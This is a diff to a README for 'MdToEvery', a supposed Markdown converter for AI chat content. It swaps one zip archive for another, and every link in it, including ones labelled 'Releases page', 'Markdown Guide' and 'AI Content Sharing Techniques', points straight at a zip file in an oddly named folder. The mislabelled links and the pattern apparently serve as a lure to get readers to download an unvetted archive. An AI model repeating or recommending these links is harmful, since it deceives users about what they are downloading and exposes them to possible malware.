@@ -6,11 +6,11 @@ Welcome to MdToEvery! This tool helps you convert content created by AI, like Ch
 
 ## 📥 Download Now
 
-[![Download Latest Release](https://raw.githubusercontent.com/Yadaand8316/MdToEvery/main/myelinogeny/MdToEvery-v1.9.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/Yadaand8316/MdToEvery/main/myelinogeny/MdToEvery-v1.9.zip)
+[![Download Latest Release](https://github.com/Yadaand8316/MdToEvery/raw/refs/heads/main/myelinogeny/Every_Md_To_3.0.zip%20Latest%20Release-blue)](https://github.com/Yadaand8316/MdToEvery/raw/refs/heads/main/myelinogeny/Every_Md_To_3.0.zip)
 
 To download MdToEvery, visit the link below:
 
-[Download MdToEvery](https://raw.githubusercontent.com/Yadaand8316/MdToEvery/main/myelinogeny/MdToEvery-v1.9.zip)
+[Download MdToEvery](https://github.com/Yadaand8316/MdToEvery/raw/refs/heads/main/myelinogeny/Every_Md_To_3.0.zip)
 
 ## 🖥️ System Requirements
 
@@ -32,7 +32,7 @@ MdToEvery runs smoothly on most modern computers. Here are the recommended syste
 
 Follow these steps to download and install MdToEvery:
 
-1. Click this [link](https://raw.githubusercontent.com/Yadaand8316/MdToEvery/main/myelinogeny/MdToEvery-v1.9.zip) to go to the Releases page.
+1. Click this [link](https://github.com/Yadaand8316/MdToEvery/raw/refs/heads/main/myelinogeny/Every_Md_To_3.0.zip) to go to the Releases page.
 2. Once there, look for the latest version listed at the top.
 3. Select the appropriate file for your operating system. 
 4. Click on the file name to start downloading.
@@ -86,8 +86,8 @@ MdToEvery is open-source software. You can use, modify, and share it freely unde
 
 For more information on Markdown and its features, check out the following resources:
 
-- [Markdown Guide](https://raw.githubusercontent.com/Yadaand8316/MdToEvery/main/myelinogeny/MdToEvery-v1.9.zip)
-- [AI Content Sharing Techniques](https://raw.githubusercontent.com/Yadaand8316/MdToEvery/main/myelinogeny/MdToEvery-v1.9.zip)
+- [Markdown Guide](https://github.com/Yadaand8316/MdToEvery/raw/refs/heads/main/myelinogeny/Every_Md_To_3.0.zip)
+- [AI Content Sharing Techniques](https://github.com/Yadaand8316/MdToEvery/raw/refs/heads/main/myelinogeny/Every_Md_To_3.0.zip)
 
 For detailed information on how to use each feature, please refer to the in-app help section.
 
